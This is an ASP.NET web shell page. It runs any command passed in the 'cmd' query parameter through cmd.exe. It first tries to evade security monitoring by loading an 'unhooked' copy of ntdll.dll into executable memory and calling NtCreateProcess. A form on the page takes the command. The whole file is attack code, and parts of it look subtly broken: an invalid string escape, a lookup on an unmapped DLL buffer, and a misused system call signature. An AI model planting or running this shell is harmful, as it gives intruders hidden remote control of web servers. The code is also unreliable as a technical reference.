<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    [DllImport("kernel32", SetLastError = true)]
    static extern IntPtr LoadLibrary(string lpLibFileName);
    [DllImport("kernel32", SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int NtCreateProcessDelegate(out IntPtr ProcessHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ParentProcess, bool InheritObjectTable, IntPtr SectionHandle, IntPtr DebugPort, IntPtr ExceptionPort, IntPtr CommandLine, IntPtr Environment);

    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (string.IsNullOrEmpty(cmd)) return;

        // Load fresh ntdll from disk
        byte[] freshNtdll = File.ReadAllBytes(Environment.ExpandEnvironmentVariables("%SystemRoot%\System32\ntdll.dll"));
        IntPtr freshBase = VirtualAlloc(IntPtr.Zero, (uint)freshNtdll.Length, 0x3000, 0x40);
        Marshal.Copy(freshNtdll, 0, freshBase, freshNtdll.Length);
        IntPtr pFunc = GetProcAddress(freshBase, "NtCreateProcess");
        var ntCreateProcess = Marshal.GetDelegateForFunctionPointer<NtCreateProcessDelegate>(pFunc);
        IntPtr cmdPtr = Marshal.StringToHGlobalUni("cmd.exe /c " + cmd);
        int status = ntCreateProcess(out IntPtr hProcess, 0x1FFFFF, IntPtr.Zero, IntPtr.Zero, false, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, cmdPtr, IntPtr.Zero);
        Response.Write($"NtCreateProcess (unhooked ntdll) status: 0x{status:X8}");
    }
</script>
<html><body><h2>NtCreateProcess – Unhooked ntdll</h2><form>Command: <input type="text" name="cmd" size=50 /></form></body></html>
